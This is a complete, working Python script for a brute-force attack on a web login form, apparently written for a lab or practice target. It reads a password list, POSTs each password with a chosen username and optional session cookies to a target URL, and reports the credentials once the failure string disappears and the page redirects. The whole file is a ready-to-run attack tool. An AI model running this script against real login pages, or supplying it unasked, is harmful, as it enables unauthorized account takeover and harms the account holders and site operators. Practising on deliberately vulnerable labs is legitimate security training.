import requests
import sys

def read_passwords(file_path):
    """
    Read passwords from a file.
    :param file_path: Path to the file containing passwords.
    :return: A list of passwords.
    """
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: Password file '{file_path}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading password file: {str(e)}")
        sys.exit(1)

def decide(response, failure_string, original_url):
    """
    Decide whether the login was successful based on the response.
    :param response: The HTTP response object.
    :param failure_string: The string indicating login failure.
    :param original_url: The original login URL to check for redirection.
    :return: True if login succeeded, False otherwise.
    """
    # Check if the response URL is different from the original URL (indicates redirection)
    if failure_string not in response.text and response.url != original_url:
        return True

    elif failure_string in response.text:
        return False
    
    return False

def brute_force(url, username, passwords, failure_string, cookies=None):
    """
    Perform brute force attack on the given URL.
    :param url: Target login page URL.
    :param username: Username to brute force.
    :param passwords: List of passwords to test.
    :param failure_string: String indicating login failure in server response.
    :param cookies: Session cookies for authentication.
    """
    headers = {}
    if cookies:
        headers['Cookie'] = cookies  # Add cookies to the request headers


    for password in passwords:
        print(f"Trying: {password}")
        data = {'username': username, 'password': password, 'Login': 'submit'}
        try:
            # Send POST request and allow redirections
            response = requests.post(url, data=data, headers=headers, allow_redirects=True)

            if decide(response, failure_string, url):
                print(f"Found username ==> {username}")
                print(f"Found password ==> {password}")
                return

        except requests.RequestException as e:
            print(f"Error during request: {str(e)}")
            sys.exit(1)

    print("No match found.")

if __name__ == "__main__":
    """
    Main entry point of the script. 
    Parses command-line arguments and starts the brute force attack.
    """
    if len(sys.argv) < 5:
        print("Usage: python bruteforce_part2.py <URL> <username> <password_file> <failure_string> [cookies]")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]
    failure_string = sys.argv[4]
    cookies = sys.argv[5] if len(sys.argv) > 5 else None

    # Validate the URL
    if not url.startswith("http://") and not url.startswith("https://"):
        print("Error: Invalid URL. Please provide a valid URL starting with http:// or https://.")
        sys.exit(1)

    passwords = read_passwords(password_file)
    brute_force(url, username, passwords, failure_string, cookies)
